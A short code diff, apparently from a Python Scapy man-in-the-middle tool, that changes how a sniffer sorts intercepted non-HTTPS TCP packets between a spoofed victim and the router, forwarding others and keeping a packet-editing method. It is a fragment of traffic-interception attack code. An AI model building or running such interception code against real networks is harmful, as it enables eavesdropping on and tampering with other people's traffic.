@@ -21,17 +21,21 @@ class Sniffer:
         return IP in packet and Raw in packet and TCP in packet and packet[TCP].sport != 443 and packet[TCP].dport != 443
 
     def sniff_all(self):
-        sniff(lfilter=self.all_filter, prn=self.navigate_packets)
+        sniff(prn=self.navigate_packets)
 
     def navigate_packets(self, packet):
-        if packet[IP].src == self.spoofer.targetIP:
-            self.handle_packets_from_victim(packet)
-        elif packet[IP].dst == self.spoofer.targetIP:
-            self.handle_packets_from_router(packet)
+        if self.all_filter(packet):
+            if packet[IP].src == self.spoofer.targetIP:
+                self.handle_packets_from_victim(packet)
+            elif packet[IP].dst == self.spoofer.targetIP:
+                self.handle_packets_from_router(packet)
         else:
-            pass
+            self.send_packet(packet)
+
+                #packet.show()
 
     def send_packet(self, packet):
+        
         send(packet)
 
     def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
